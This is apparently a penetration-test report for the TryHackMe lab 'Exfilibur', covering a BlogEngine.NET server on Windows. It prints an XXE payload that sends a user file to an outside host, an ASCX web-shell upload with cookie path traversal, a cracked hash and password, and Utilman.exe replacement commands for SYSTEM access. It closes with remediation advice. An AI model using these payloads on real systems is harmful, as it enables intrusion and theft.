Exfilibur — Penetration Test Disclosure Report

TryHackMe Hard · 2026-07-07

Target: 10.67.187.66 Assessment Date: 2026-07-07 Classification: CONFIDENTIAL

1. Executive Summary

A penetration test was conducted against the target EXFILIBUR (10.67.187.66), a Windows Server 2019 host running IIS 10.0 with BlogEngine.NET 3.3.7.0. Four vulnerabilities were identified and chained to achieve full SYSTEM-level compromise. Initial access was gained via XML External Entity (XXE) injection in the blog's pingback functionality, followed by credential harvesting and a theme-upload remote code execution vulnerability in BlogEngine. Local privilege escalation was achieved by abusing SeTakeOwnershipPrivilege to replace system binaries. Both user-level and administrative flags were captured.

5. Detailed Findings

F-01: BlogEngine XXE via pingback.axd (CVE-2019-11392)

Severity: High (CVSSv3: 7.5) Affected Component: /blog/pingback.axd

Description: BlogEngine.NET 3.3.7.0 fails to disable XML external entity processing in the pingback endpoint. This allows an unauthenticated attacker to read arbitrary files from the server filesystem via an out-of-band (OOB) XXE attack.

Steps to Reproduce:

POST /blog/pingback.axd HTTP/1.1
Host: 10.67.187.66
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://192.168.147.191:8000/ex.dtd">
  %remote;
  %param1;
]>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params><param><value><string>&exfil;</string></value></param></params>
</methodCall>

With ex.dtd hosting:

<!ENTITY % file SYSTEM "file:///C:/inetpub/wwwroot/blog/App_Data/users.xml">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.147.191:8000/?data=%file;'>">

Impact: Unauthenticated file read from the server. Hash values for three users (Admin, merlin, guest) were exfiltrated.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, low complexity, no privileges required, high confidentiality impact.

F-02: BlogEngine Theme Upload RCE (CVE-2019-10719 / CVE-2019-10720)

Severity: High (CVSSv3: 8.8) Affected Component: /blog/api/upload

Description: BlogEngine's file upload functionality does not validate uploaded file types, and the theme cookie path is not sanitized. An authenticated attacker can upload a malicious .ascx file and access it by setting the theme cookie to the upload directory, achieving arbitrary code execution under the IIS application pool identity.

Steps to Reproduce:

  1. Upload PostView.ascx with command execution code:
    2. POST /blog/api/upload?action=filemgr HTTP/1.1
x-blog-instance: 96d5b379-7e1d-4dac-a6ba-1e50db561b04
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="PostView.ascx"

<%@ Control Language="C#" AutoEventWireup="true" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd","/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %>
  2. Set cookie: theme=../../App_Data/files/2026/07/;
  3. Access /?cmd=whoami

Impact: Remote code execution as exfilibur\merlin user, leading to full foothold on the server.

CVSS Justification: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — Authenticated but low complexity, all three CIA impacts high.

F-03: Weak Password — Guest Account

Severity: Medium (CVSSv3: 5.3) Affected Component: BlogEngine guest user account

Description: The guest account password hash was crackable to guest, allowing unauthorized access to the blog CMS. While the guest account had limited permissions, it provided access to internal draft posts containing sensitive information.

Steps to Reproduce:

  1. Extract hash via XXE: hJg8YPfarcHLhphiH4AsDZ+aPDwpXIEHSPsEgRXBhuw=
  2. Crack with hashcat
  3. Login at /blog/ with guest:guest

Impact: Unauthorized blog access, leading to discovery of King Arthur's password in a draft post.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N — No privileges needed, low confidentiality and integrity impact.

F-04: Weak Password — King Arthur Account

Severity: High (CVSSv3: 7.3) Affected Component: kingarthy user account / RDP

Description: The kingarthy account password (Excal1burP@ss1337) was found stored in plaintext in a blog draft page. This password, while complex, was exposed via poor operational security — stored in a CMS draft accessible to any authenticated blog user. The account was a member of Remote Desktop Users.

Steps to Reproduce:

  1. Log in as guest
  2. Navigate to draft post "Decoding Camelot: Unveiling King Arthur's Secret Word"
  3. Extract password: Excal1burP@ss1337
  4. Connect via RDP

Impact: Full interactive desktop access as kingarthy, enabling local privilege escalation.

CVSS Justification: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N — Network-accessible, authenticated, high CIA impacts.

F-05: Local Privilege Escalation via SeTakeOwnershipPrivilege

Severity: High (CVSSv3: 7.8) Affected Component: Utilman.exe / sethc.exe — Windows accessibility binaries

Description: The kingarthy account had SeTakeOwnershipPrivilege enabled, allowing it to take ownership of protected system files. By taking ownership of Utilman.exe (or sethc.exe) and replacing it with cmd.exe, an attacker can achieve SYSTEM-level command execution through the Ease of Access center on the Windows lock screen.

Steps to Reproduce:

takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant kingarthy:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe

Lock screen → click Ease of Access icon → SYSTEM cmd.

Impact: Full SYSTEM-level compromise. Attacker can read any file, install software, create users, and persist indefinitely.

CVSS Justification: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — Local access, low complexity, low privileges, all impacts high.

6. Remediation Recommendations

  1. F-01: Update BlogEngine.NET to the latest version. Disable XML external entity processing at the application level. Validate and sanitize all XML input to the pingback endpoint.
  2. F-02: Restrict file uploads to safe extensions (e.g., images only). Validate theme cookie paths to prevent directory traversal. Update BlogEngine to patched version.
  3. F-03: Enforce password complexity requirements. Change default guest credentials immediately.
  4. F-04: Never store credentials in CMS pages or drafts. Implement credential manager / vault for shared secrets.
  5. F-05: Review user privilege assignments — SeTakeOwnershipPrivilege should not be granted to standard users. Implement Windows Defender Attack Surface Reduction rules to block binary substitution attacks.
